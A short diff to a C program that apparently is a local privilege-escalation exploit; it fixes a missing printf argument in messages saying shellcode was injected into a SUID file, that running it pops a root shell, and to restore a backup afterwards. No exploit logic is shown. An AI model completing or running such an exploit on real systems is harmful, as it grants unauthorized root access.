@@ -152,7 +152,7 @@ int main(int argc, char *argv[])
     pthread_join(pth,NULL);
   }
 
-  printf("Done! Check %s to see if the shell code has got injected.\n", );
+  printf("Done! Check %s to see if the shell code has got injected.\n", suid_file);
   printf("You can run '%s' to pop a root shell.\n\n", suid_file);
     printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
     backup_filename, suid_file);
